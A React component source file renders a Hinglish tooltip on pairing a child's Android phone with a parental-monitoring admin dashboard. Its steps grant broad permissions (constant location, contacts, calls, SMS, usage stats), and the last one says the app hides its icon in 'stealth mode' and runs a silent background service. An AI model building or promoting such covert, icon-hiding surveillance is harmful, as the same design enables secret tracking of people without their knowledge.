// components/admin/devices/PairingGuideTooltip.tsx
"use client";

import React, { useState, useEffect } from "react";
import { Tooltip } from "@/components/ui/Tooltip";
import { HelpCircle, Sparkles } from "lucide-react";

export const PairingGuideTooltip: React.FC = () => {
  const [displayUrl, setDisplayUrl] = useState("localhost:3000/admin/devices");

  useEffect(() => {
    if (typeof window !== "undefined") {
      // Exact address bar detection: local shows local, domain shows domain!
      setDisplayUrl(`${window.location.host}/admin/devices`);
    }
  }, []);

  const guideContent = (
    <div className="space-y-2.5 text-xs">
      <div className="flex items-start gap-2.5">
        <span className="w-5 h-5 rounded-full bg-amber-500/20 text-amber-800 dark:bg-[#FFFC00] dark:text-black font-black text-[10px] flex items-center justify-center shrink-0 mt-0.5 shadow-sm">
          1
        </span>
        <p className="leading-relaxed">
          Apne Admin Dashboard (
          <span className="text-amber-700 dark:text-[#FFFC00] font-mono text-[11px] underline font-bold">
            {displayUrl}
          </span>
          ) par jayein aur <strong>&quot;Register Device&quot;</strong> dabayein.
        </p>
      </div>

      <div className="flex items-start gap-2.5">
        <span className="w-5 h-5 rounded-full bg-amber-500/20 text-amber-800 dark:bg-[#FFFC00] dark:text-black font-black text-[10px] flex items-center justify-center shrink-0 mt-0.5 shadow-sm">
          2
        </span>
        <p className="leading-relaxed">
          Bache ka naam likhein (e.g. &quot;Ali&quot;), aapko 6-digit ka <strong>Pairing Code</strong> milega (e.g. <span className="font-mono text-amber-700 dark:text-[#FFFC00] font-bold">9YMQES</span>).
        </p>
      </div>

      <div className="flex items-start gap-2.5">
        <span className="w-5 h-5 rounded-full bg-amber-500/20 text-amber-800 dark:bg-[#FFFC00] dark:text-black font-black text-[10px] flex items-center justify-center shrink-0 mt-0.5 shadow-sm">
          3
        </span>
        <p className="leading-relaxed">
          Bache ke phone par APK open karke wo <strong>Pairing Code</strong> daalein.
        </p>
      </div>

      <div className="flex items-start gap-2.5">
        <span className="w-5 h-5 rounded-full bg-amber-500/20 text-amber-800 dark:bg-[#FFFC00] dark:text-black font-black text-[10px] flex items-center justify-center shrink-0 mt-0.5 shadow-sm">
          4
        </span>
        <p className="leading-relaxed">
          Android permissions ko <strong>&quot;Allow&quot;</strong> karein (Location: <em>Allow all the time</em>, Contacts, Calls, SMS, Usage Stats).
        </p>
      </div>

      <div className="flex items-start gap-2.5">
        <span className="w-5 h-5 rounded-full bg-amber-500/20 text-amber-800 dark:bg-[#FFFC00] dark:text-black font-black text-[10px] flex items-center justify-center shrink-0 mt-0.5 shadow-sm">
          5
        </span>
        <p className="leading-relaxed">
          App verify hokar stealth mode me <strong>icon hide</strong> kar legi aur silent background service chalu ho jayegi!
        </p>
      </div>
    </div>
  );

  return (
    <Tooltip
      title="C. First-Time Pairing Step (Sirf 1 Minute):"
      content={guideContent}
      placement="bottom-right"
      widthClass="w-[calc(100vw-2rem)] max-w-sm sm:w-96"
    >
      <div className="h-7 sm:h-8 md:h-9 px-2 sm:px-3 md:px-3.5 rounded-full bg-amber-500/10 dark:bg-[#FFFC00]/10 hover:bg-amber-500/20 dark:hover:bg-[#FFFC00]/20 border border-amber-500/30 dark:border-[#FFFC00]/30 text-amber-700 dark:text-[#FFFC00] text-[10px] sm:text-xs font-bold transition-all shadow-sm active:scale-95 flex items-center justify-center gap-1 sm:gap-1.5 shrink-0 select-none cursor-pointer">
        <Sparkles className="w-3 h-3 sm:w-3.5 sm:h-3.5 stroke-[2.5]" />
        <span className="sm:hidden">Guide</span>
        <span className="hidden sm:inline whitespace-nowrap">Pairing Guide</span>
      </div>
    </Tooltip>
  );
};
